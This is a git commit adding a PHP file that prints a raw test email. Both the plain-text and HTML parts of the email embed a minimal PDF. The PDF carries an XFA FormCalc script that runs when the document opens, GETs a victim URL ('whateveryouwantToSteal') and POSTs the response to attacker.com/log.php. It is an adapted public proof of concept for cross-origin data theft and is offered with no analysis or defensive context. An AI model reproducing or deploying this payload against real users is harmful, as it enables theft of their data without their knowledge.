a5bd45c4cca308c3361ceb93e49371d50c7da53c
missoum1307 <missoum1307@users.noreply.github.com>
2018-04-23 01:40:48 +0200

    Create text.php

---
+++ text.php
@@ -0,0 +1,130 @@
+<?php 
+header('Content-type: text/plain; charset=utf-8')
+?>
+MIME-Version: 1.0
+Received: by 10.28.182.11 with HTTP; Sun, 22 Apr 2018 16:15:55 -0700 (PDT)
+X-Originating-IP: [178.115.227.190]
+Date: Mon, 23 Apr 2018 01:15:55 +0200
+Delivered-To: missoum@missoumsai.us
+Message-ID: <CAMob-0kdu-GTip_TFhkg-6Bz9n5xz9hFZvAA6OOFj_mZyNjoiQ@mail.gmail.com>
+Subject: test
+From: zezae eazaeeza <missoum@missoumsai.us>
+To: ezaeza zezaeza <m@missoumsai.us>, missoumozil@gmail.com
+Content-Type: multipart/alternative; boundary="001a11423f3865ef7d056a781a8d"
+
+--001a11423f3865ef7d056a781a8d
+Content-Type: text/plain; charset="UTF-8"
+
+% a PDF file using an XFA
+% most whitespace can be removed (truncated to 570 bytes or so...)
+% Ange Albertini BSD Licence 2012
+% modified by insertscript
+
+%PDF-1. % can be truncated to %PDF-\0
+
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field id="Hello World!">
+            <event activity="initialize">
+                <script contentType='application/x-formcalc'>
+                    var content =
+GET("http://example.com/whateveryouwantToSteal")
+                    POST("http://attacker.com/log.php",content)
+                </script>
+            </event>
+        </field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>
+
+--001a11423f3865ef7d056a781a8d
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+<div dir=3D"ltr"><pre style=3D"color:rgb(0,0,0);font-style:normal;font-vari=
+ant-ligatures:normal;font-variant-caps:normal;font-weight:400;letter-spacin=
+g:normal;text-align:start;text-indent:0px;text-transform:none;word-spacing:=
+0px;text-decoration-style:initial;text-decoration-color:initial;word-wrap:b=
+reak-word;white-space:pre-wrap">% a PDF file using an XFA
+% most whitespace can be removed (truncated to 570 bytes or so...)
+% Ange Albertini BSD Licence 2012
+% modified by insertscript
+
+%PDF-1. % can be truncated to %PDF-\0
+
+1 0 obj &lt;&lt;&gt;&gt;
+stream
+&lt;xdp:xdp xmlns:xdp=3D&quot;<a href=3D"http://ns.adobe.com/xdp/">http://n=
+s.adobe.com/xdp/</a>&quot;&gt;
+&lt;config&gt;&lt;present&gt;&lt;pdf&gt;
+    &lt;interactive&gt;1&lt;/interactive&gt;
+&lt;/pdf&gt;&lt;/present&gt;&lt;/config&gt;
+
+&lt;template&gt;
+    &lt;subform name=3D&quot;_&quot;&gt;
+        &lt;pageSet/&gt;
+        &lt;field id=3D&quot;Hello World!&quot;&gt;
+            &lt;event activity=3D&quot;initialize&quot;&gt;
+                &lt;script contentType=3D&#39;application/x-formcalc&#39;&g=
+t;
+                    var content =3D GET(&quot;<a href=3D"http://example.com=
+/whateveryouwantToSteal">http://example.com/whateveryouwantToSteal</a>&quot=
+;)
+                    POST(&quot;<a href=3D"http://attacker.com/log.php">http=
+://attacker.com/log.php</a>&quot;,content)
+                &lt;/script&gt;
+            &lt;/event&gt;
+        &lt;/field&gt;
+    &lt;/subform&gt;
+&lt;/template&gt;
+&lt;/xdp:xdp&gt;
+endstream
+endobj
+
+trailer &lt;&lt;
+    /Root &lt;&lt;
+        /AcroForm &lt;&lt;
+            /Fields [&lt;&lt;
+                /T (0)
+                /Kids [&lt;&lt;
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                &gt;&gt;]
+            &gt;&gt;]
+            /XFA 1 0 R
+        &gt;&gt;
+        /Pages &lt;&lt;&gt;&gt;
+    &gt;&gt;
+&gt;&gt;</pre><br></div>
+
+--001a11423f3865ef7d056a781a8d--
